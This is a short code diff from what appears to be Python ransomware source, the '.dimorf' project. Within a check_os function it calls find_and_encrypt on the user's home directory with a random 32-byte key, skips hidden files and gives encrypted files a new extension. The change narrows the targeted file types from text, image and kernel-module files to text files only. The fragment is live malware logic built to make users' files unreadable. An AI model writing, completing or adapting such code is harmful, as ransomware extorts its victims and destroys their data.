@@ -30,7 +30,7 @@ def check_os(osname: str) -> str | None:
         if (sys.version[0] == '3'):
             find_and_encrypt(
                 path=USER_DIR,
-                ext_files=['.txt', '.ko', '.png', '.jpg'],
+                ext_files=['.txt'],
                 hidden='.',
                 new_ext='.dimorf',
                 key=Random.get_random_bytes(32),
